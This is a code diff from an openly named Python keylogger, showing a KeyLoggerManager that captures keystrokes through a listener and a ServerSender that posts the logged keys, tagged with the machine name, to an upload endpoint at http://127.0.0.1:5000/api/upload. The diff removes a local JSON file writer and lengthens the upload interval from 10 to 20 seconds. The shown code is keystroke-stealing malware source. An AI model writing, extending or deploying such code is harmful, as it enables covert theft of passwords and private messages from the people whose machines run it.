@@ -33,17 +33,6 @@ class KeyLoggerService:
     def clear_logs(self):
         self.all_logs = []
 
-class FileWriter:
-    @staticmethod
-    def write_to_file(logs, machine_name= platform.node()):
-        new_task = {
-            "machine": machine_name,
-            "data": logs
-        }
-        with open("log.json", "a", encoding="utf-8") as log_file:
-            json.dump(new_task, log_file, indent=2, ensure_ascii=False)
-            log_file.write("\n")
-
 class ServerSender:
     def __init__(self, server_url, service, machine_name= platform.node() ):
         self.server_url = server_url
@@ -73,12 +62,11 @@ class ServerSender:
                         self.service.clear_logs()
                 except requests.exceptions.RequestException as e:
                     print(f"Error sending data: {e}")
-            time.sleep(10)
+            time.sleep(20)
 
 class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
-        self.file_writer = FileWriter()
         self.machine_name = platform.node()
         self.server_base = "http://127.0.0.1:5000"
         self.server_sender = ServerSender(f"{self.server_base}/api/upload", self.service, self.machine_name)
@@ -90,7 +78,6 @@ class KeyLoggerManager:
         self.service.add_key(key)
         if key == Key.space:
             logs = self.service.save_and_clear()
-            self.file_writer.write_to_file(logs)
 
     def start(self):
         if not self.listener:
